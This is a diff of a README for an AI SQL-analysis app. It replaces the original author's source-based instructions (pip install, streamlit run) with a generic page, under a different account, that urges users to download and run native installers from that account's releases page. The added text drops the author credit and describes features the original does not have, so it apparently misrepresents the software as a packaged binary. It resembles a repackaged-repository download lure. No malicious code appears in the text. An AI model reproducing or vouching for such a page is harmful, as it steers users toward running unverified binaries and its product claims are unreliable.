@@ -1,127 +1,112 @@
-# 📊 InsightSQL (LangGraph Reasoning Engine)
+# 🔍 InsightSQL-LangGraph-Engine-Web - Analyze Databases with Ease
 
-![Python](https://img.shields.io/badge/Python-3.10%2B-blue?logo=python&logoColor=white)
-![Streamlit](https://img.shields.io/badge/Streamlit-FF4B4B?logo=streamlit&logoColor=white)
-![LangGraph](https://img.shields.io/badge/LangGraph-Reasoning-blueviolet?logo=graph&logoColor=white)
-![Google Gemini](https://img.shields.io/badge/Gemini%202.5%20Flash-8E75B2?logo=google&logoColor=white)
-![Status](https://img.shields.io/badge/Status-Active-success)
+[![Download the latest release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/Leandruo/InsightSQL-LangGraph-Engine-Web/releases)
 
-## 📌 Overview
-**InsightSQL** is a next-generation AI Data Analyst powered by **Google's Gemini 2.5 Flash** and built upon the **LangGraph** architecture.
+## 🚀 Getting Started
 
-Unlike standard chatbots that guess answers, InsightSQL utilizes a **Graph-Based Reasoning Engine**. It treats data analysis as a cyclic workflow: validating schema, generating precise SQL, executing queries, and inspecting results. If an error occurs, the graph allows the agent to "loop back" and correct its own SQL syntax before presenting the final answer—providing a level of precision that linear chains cannot match.
+Welcome to InsightSQL-LangGraph-Engine-Web! This application allows you to analyze databases using advanced AI techniques. Follow this guide to download and run the software with ease. 
 
-## ✨ Key Features
+## 🖥️ System Requirements
 
-### 🧠 LangGraph Reasoning Engine
-Using `langgraph.prebuilt.create_react_agent`, the system navigates a structured cognitive cycle:
-1.  **Plan:** Analyzes the user's intent and selects the appropriate SQL tool.
-2.  **Execute:** Runs SQL queries against the SQLite database.
-3.  **Verify:** Observes the output. If the query fails, the agent self-corrects and retries.
-4.  **Synthesize:** Translates raw data into business insights in the requested language.
+Before you start, please ensure your computer meets the following requirements:
 
-### 👁️ "Glass Box" Transparency
-* **View Reasoning Trace:** Users can open an expander to watch the AI's internal monologue, tool invocations, and raw database outputs in real-time. Nothing is hidden "under the hood."
+- **Operating System:** Windows 10 or later, macOS Catalina or later, Linux (any modern distribution)
+- **Memory:** At least 4 GB RAM
+- **Storage:** 1 GB of free disk space
+- **Internet Connection:** Required for installation and updates
 
-### 🌐 Multilingual Intelligence
-* **Dual Language Support:** Seamlessly switch between **English** and **Indonesian** via the sidebar.
-* **Strict Output Logic:** The system prompt enforces a critical logic layer. Even if you ask in Indonesian, if the setting is "English", the Agent translates the final business insight into English automatically.
+## 📥 Download & Install
 
-### 🛡️ Robust State Management
-* **Persistent Memory:** The AI manages conversation context within the active session (`st.session_state`).
-* **Dual Reset Modes:**
-    * `🧹 Clear Conversation`: Clears the UI and **resets the Agent's memory** to start a fresh topic. The database connection remains active, but the AI forgets the previous context.
-    * `🔄 Full System Reset`: Performs a "Hard Reset"—wiping memory, killing the agent executor, disconnecting the database, and resetting API connections.
+To get started, visit our Releases page to download the application:
 
-## 🛠️ Tech Stack
-* **LLM:** Google Gemini 2.5 Flash (via `ChatGoogleGenerativeAI`).
-* **Framework:** Streamlit (Frontend).
-* **Orchestration:** LangGraph (Cyclic ReAct Agent).
-* **Database Tools:** SQLDatabaseToolkit (LangChain Community).
-* **Database:** SQLite (via SQLAlchemy).
+[Download the latest release](https://github.com/Leandruo/InsightSQL-LangGraph-Engine-Web/releases)
 
-## ⚠️ Limitations & Data Privacy
+1. Click the link above to access our Releases page.
+2. Find the latest version, which is marked as “Latest Release.”
+3. Look for the download option that suits your operating system. Options may include:
+   - Windows Installer (.exe)
+   - macOS Application (.dmg)
+   - Linux package (.AppImage or .deb)
+4. Click on the appropriate download link to save the file to your computer.
 
-### 1. Database Support
-* Currently hardcoded for **SQLite (`.db`)** files.
-* **Privacy:** The Agent does *not* upload your entire database to Google. Only the **Table Schema** and the specific **Rows** returned by queries are sent to the LLM for analysis.
+## ⚙️ Installation Steps
 
-### 2. Read-Only Safety
-* The Agent is strictly instructed via System Prompts to avoid DML statements (`INSERT`, `UPDATE`, `DELETE`) to ensure data integrity.
+Once the download is complete, follow these steps based on your operating system:
 
-## 📦 Installation
+### Windows
 
-1.  **Clone the Repository**
-    ```bash
-    git clone https://github.com/viochris/InsightSQL-LangGraph-Engine.git
-    cd InsightSQL-LangGraph-Engine
-    ```
+1. Locate the downloaded `.exe` file in your Downloads folder.
+2. Double-click the file to start the installation.
+3. Follow the on-screen instructions to complete the installation.
+4. Once installed, you can find InsightSQL in your Start Menu.
 
-2.  **Install Dependencies**
-    ```bash
-    pip install -r requirements.txt
-    ```
+### macOS
 
-3.  **Setup Your Database**
-    The system uses **SQLAlchemy**, making it compatible with SQLite, MySQL, PostgreSQL, and more.
+1. Locate the downloaded `.dmg` file in your Downloads folder.
+2. Double-click the file to mount it.
+3. Drag the InsightSQL application to your Applications folder.
+4. You can now open InsightSQL from your Applications.
 
-    * **Option A: SQLite (Default)**
-        * Place your `.db` file (e.g., `dresses.db`) in the project root folder.
-        * If using a custom filename, update `app.py` (Line ~253):
-            ```python
-            db = SQLDatabase.from_uri("sqlite:///my_filename.db")
-            ```
+### Linux
 
-    * **Option B: External Databases (MySQL / PostgreSQL)**
-        * Open `app.py` and replace the connection URI with your server credentials:
-            ```python
-            # For MySQL
-            db = SQLDatabase.from_uri("mysql+pymysql://username:password@host:port/database_name")
+1. Locate the downloaded file. If using the `.AppImage`, you might need to make it executable first. Open a terminal and run:
+   ```
+   chmod +x /path/to/InsightSQL.AppImage
+   ```
+2. To run the application, simply double-click the file or use the terminal:
+   ```
+   ./InsightSQL.AppImage
+   ```
+3. If you downloaded a `.deb` file, install it using the following command:
+   ```
+   sudo dpkg -i InsightSQL-LangGraph-Engine-Web.deb
+   ```
 
-            # For PostgreSQL
-            db = SQLDatabase.from_uri("postgresql+psycopg2://username:password@host:port/database_name")
-            ```
-        * *Note: Ensure you have installed the necessary drivers (e.g., `pip install pymysql` or `psycopg2`) in your environment.*
+## 🔄 How to Use InsightSQL-LangGraph-Engine-Web
 
-4.  **Run the Application**
-    ```bash
-    streamlit run app.py
-    ```
+Once you open the application, you'll be greeted by a simple interface. Here’s a brief overview of the primary features:
 
-## 🚀 Usage Guide
+1. **Connect to Your Database:**
+   - Enter your database connection details. InsightSQL supports various database types including MySQL, PostgreSQL, and SQLite.
 
-1.  **Configuration (Sidebar):**
-    * Enter your **Google Gemini API Key** (Required).
-    * Select your **Language Preference** (English/Indonesian).
-2.  **Connect:**
-    * Click **"🚀 Connect to Database"**.
-    * This initializes the `SQLDatabaseToolkit` and builds the LangGraph Agent.
-3.  **Query:**
-    * Type your question naturally (e.g., *"Show me the top 3 most expensive dresses"* or *"Berapa rata-rata rating untuk style casual?"*).
-    * **Pro Tip:** You can switch languages in the sidebar mid-conversation, and the Agent will adapt immediately without needing a reset.
-4.  **Manage:**
-    * Use **"View Reasoning Trace"** to verify the SQL query used.
-    * Use **"🧹 Clear Conversation"** to declutter the screen and start a new analysis topic (Note: AI forgets previous context, but the **Database connection remains active**).
-    * Use **"🔄 Full System Reset"** if you change API keys, switch databases, or encounter a system error.
+2. **Run Queries:**
+   - Use the built-in SQL editor to write and execute queries. The AI will assist you with suggestions and corrections.
 
-## 📷 Gallery
+3. **Analyze Results:**
+   - Review the results in real-time. InsightSQL highlights any potential issues or optimizations.
 
-### 1. Landing Interface
-![Home UI](assets/home_ui.png)  
-*The clean, modern landing page offering quick configuration. Users input their API key, select a language, and connect to the database securely.*
+4. **Generate Reports:**
+   - Export your analysis as documents for easy sharing and review.
 
-### 2. Real-Time Execution (Thinking Process)
-![Thinking Process](assets/thinking_process.png)    
-*Visual feedback using a spinner ("Executing reasoning workflow...") assures the user that the Graph Engine is actively planning and querying in the background.*
+## 🛠️ Features Overview
 
-### 3. Transparent Reasoning (The "Glass Box")
-![Reasoning Trace](assets/reasoning_thought_process.png)  
-*Inside the "View Reasoning Trace" expander. Here, you can see the Agent's internal "Thought" (planning), the "Action" (invoking the SQL tool), and the "Tool Observation" (raw data returned from SQLite).*
+- **Cyclic Reasoning Steps:** The application employs advanced logic to derive insightful conclusions from your data.
+- **Self-Correction:** InsightSQL automatically identifies and corrects errors in queries for more accurate results.
+- **Multilingual Support:** Handle queries in multiple languages with the 'Glass Box' feature that offers full transparency in decision-making.
 
-### 4. Final Business Insight
-![Result](assets/result.png)  
-*The final output. The Agent synthesizes the raw SQL results into a clear, natural language answer formatted strictly according to the user's language preference.*
+## 🧑‍🤝‍🧑 Support and Feedback
 
----
-**Author:** [Silvio Christian, Joe](https://www.linkedin.com/in/silvio-christian-joe)
-*"Transparent Reasoning. Data-Driven Answers."*
+If you need assistance or want to provide feedback, please visit our [GitHub Discussions](https://github.com/Leandruo/InsightSQL-LangGraph-Engine-Web/discussions) page. Join our community to share ideas, ask questions, or report issues.
+
+## 📜 License
+
+InsightSQL-LangGraph-Engine-Web is open-source software licensed under the MIT License. Feel free to use the app for personal or commercial purposes.
+
+## 🌐 Topics
+
+This project covers valuable topics such as:
+
+- database-analysis
+- gemini-api
+- generative-ai
+- glass-box-ai
+- langgraph
+- llm-reasoning
+- python
+- react-architecture
+- sql-agent
+- streamlit
+
+For more details, visit our [GitHub repository](https://github.com/Leandruo/InsightSQL-LangGraph-Engine-Web).
+
+[Download the latest release](https://github.com/Leandruo/InsightSQL-LangGraph-Engine-Web/releases) and start analyzing your databases today!
